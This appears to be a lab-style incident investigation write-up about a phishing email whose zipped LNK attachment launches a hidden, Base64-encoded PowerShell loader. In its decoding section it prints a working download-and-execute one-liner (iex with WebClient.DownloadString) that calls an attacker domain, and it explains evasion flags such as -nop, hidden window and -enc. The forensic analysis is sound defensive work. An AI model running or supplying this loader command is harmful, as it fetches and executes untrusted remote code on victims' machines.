1.0 Scenario Overview
This investigation analyses a phishing-based compromise that resulted in malicious PowerShell execution, attacker-controlled activity, and data exfiltration from a Windows workstation.
The attack began with a phishing email containing an encrypted attachment. Once executed, the attachment launched an encoded PowerShell command that established communication with attacker-controlled infrastructure and initiated a series of malicious activities on the victim machine.
Using PowerShell logs, packet capture analysis, and email artefacts, the investigation reconstructed the attacker’s actions, including tool downloads, system enumeration, sensitive file access, and outbound data transfers.
The objective of this investigation was to identify how the compromise occurred, trace the attacker’s activity across the system and network, and determine the overall impact of the intrusion.

2. Investigation Flow
   2.1.0 Intial Access (Phishing Email Execution Chain)
The intrusion began with a phishing email delivered to the victim’s mailbox. The email contained a malicious attachment (invoice.zip) encrypted & disguised to bypass basic email filtering and appear legitimate while executing hidden commands upon interaction.
Evidence: Phishing Email (dump.eml)
The file in invoice.zip was actually a LNK file that functioned as the execution trigger, initiating PowerShell-based payload delivery once the attachment was opened.
Evidence: LNK file (lnkparseresults.png)
Initial Access Summary: The phishing email delivered a malicious attachment which, upon execution, triggered a LNK-based launcher that initiated an encoded PowerShell command, marking the start of endpoint compromise.
   2.1.1 PowerShell Execution Analysis
   Encoded command (raw)
   
This is a Base64-encoded PowerShell command using:
-nop → No Profile (avoids user scripts)
-windowstyle hidden → hides execution window
-enc → encoded command (obfuscation)
## This is a classic execution evasion technique used in phishing-based attacks.

   2.1.2 Decoded command
When decoded, the Base64 string becomes: iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
1. iex
Short for Invoke-Expression
Executes whatever is returned
2. new-object net.webclient
Creates a web client object
Used for network communication
3. downloadstring()
Downloads content from a remote server
4. Remote URL
http://files.bpakcaging.xyz/update
This is the attacker-controlled infrastructure
Used to fetch second-stage payload

   2.1.3 — Attack behavior classification
This is:
✔ Living-off-the-land technique
Using built-in PowerShell tools instead of malware binaries

✔ Remote payload execution (fileless)
No file is saved — code runs directly in memory

✔ Stage 1 loader
This is NOT the final payload — it fetches more malicious code

Summary 
The encoded PowerShell command indicates an attempt to execute a hidden script that retrieves and runs additional malicious content from an external attacker-controlled domain. The use of encoded execution parameters and hidden window style strongly suggests deliberate obfuscation to evade detection.

  2.3.0 Attacker Activity
Based on the initial findings, we discovered how the malicious attachment compromised the workstation:
A PowerShell command was executed.
Decoding the payload reveals the starting point of endpoint activities. 
With the discoveries above, next is to proceed with analysing the PowerShell logs to uncover the potential impact of the attack:
Using the previous findings, we start our analysis by searching the execution of the initial payload in the PowerShell logs.
Since the data is JSON, we can parse it in CLI using the jq (﻿a lightweight and flexible command-line JSON processor)





